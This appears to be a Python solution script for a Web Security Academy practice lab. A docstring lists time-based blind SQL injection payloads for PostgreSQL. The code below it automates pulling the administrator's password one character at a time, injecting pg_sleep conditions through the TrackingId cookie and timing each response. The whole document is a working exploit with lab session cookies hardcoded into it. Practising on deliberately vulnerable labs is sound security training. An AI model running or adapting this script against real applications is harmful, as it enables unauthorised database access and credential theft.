# Blind SQL injection with time delays and information retrieval
"""
    1. Confirm that the parameter is vulnerable to SQLi
    TrackingId=x' || pg_sleep(10) --
    or: ' || (SELECT pg_sleep(10))--        bắt buộc phải có ngoặc 

    2. Confirm that the users table exists in the database
    ' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END) --
    ' || (SELECT CASE WHEN (1=0) THEN pg_sleep(10) ELSE pg_sleep(-1) END) --

    ' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(-1) END from users) --
    or ' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END from users WHERE username='administrator') --
    or ' || (SELECT pg_sleep(10) from users WHERE username='administrator') --
    
    3. Enumerate the password length 
    ' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)=20) THEN pg_sleep(10) ELSE pg_sleep(-1) END from users) --

    ' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password, 1, 1)= 'a') THEN pg_sleep(10) ELSE pg_sleep(-1) END from users) --
"""

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import urllib

proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080' }

headers = {
    'Host': '0a4e00d70451e4d081c26bbc00df00fc.web-security-academy.net',
    'Cookie': 'TrackingId=EjapMRjt652mOVTu; session=pV9krZ2S58ZMcvPAZu6WDk44BeFPYUvP',
    'Sec-Ch-Ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Linux"',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://0a4e00d70451e4d081c26bbc00df00fc.web-security-academy.net/',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9'
}
#respone = requests.get(url, headers=headers, proxies=proxies, verify=False)


def sqli_password(url):  
    password_extracted = ""
    for i in range(1,21):
        for j in range (32, 126):
            sql_payload = "' || (SELECT CASE WHEN (username='administrator' AND ascii(SUBSTRING(password, %s, 1))= '%s') THEN pg_sleep(10) ELSE pg_sleep(-1) END from users) --"  % (i,j)
            sql_payload_encoded = urllib.parse.quote(sql_payload)
            cookies = {
                'TrackingId': 'EjapMRjt652mOVTu' + sql_payload,
                'session': 'pV9krZ2S58ZMcvPAZu6WDk44BeFPYUvP'
            }
            # dùng sql_payload hoặc sql_payload_encoded đều được 
            r = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
            if(int(r.elapsed.total_seconds()) > 9):
                password_extracted += chr(j)
                sys.stdout.write('\r'+ password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r'+ password_extracted + chr(j))
                sys.stdout.flush()                            
    
def main(): 
    if len(sys.argv) != 2:
        print ("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print ('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("[+] Retreiving administrator password")
    sqli_password(url)
    
if __name__ == '__main__':
    main()

